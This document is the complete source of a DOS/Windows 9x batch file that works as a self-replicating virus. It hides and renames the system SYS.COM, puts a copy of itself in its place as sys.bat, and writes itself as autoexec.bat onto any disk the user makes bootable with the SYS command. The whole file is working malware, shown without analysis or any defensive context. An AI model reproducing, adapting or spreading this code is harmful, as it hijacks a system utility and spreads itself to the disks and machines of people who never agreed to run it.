@echo off
rem Angus Neborg-SO.HT.AI.KS
if not "%0"=="sys" goto inboot
attrib -H %windir%\command\sys.old>nul
ren %windir%\command\sys.old sys.com>nul
%windir%\command\sys.com %1 %2
ren %windir%\command\sys.com sys.old>nul
attrib +H %windir%\command\sys.old>nul
if "%1"=="" goto end
if "%1"=="/?" goto end
if not "%2"=="" shift
copy /y %windir%\command\sys.bat %1\autoexec.bat>nul
copy /y %windir%\command\attrib.exe %1\attrib.exe>nul
goto end
:inboot
if not exist %windir%\command\sys.com goto end
if exist %windir%\command\sys.old goto end
ren %windir%\command\sys.com sys.old>nul
attrib +H %windir%\command\sys.old>nul
copy /y %0 %windir%\command\sys.bat>nul
:end
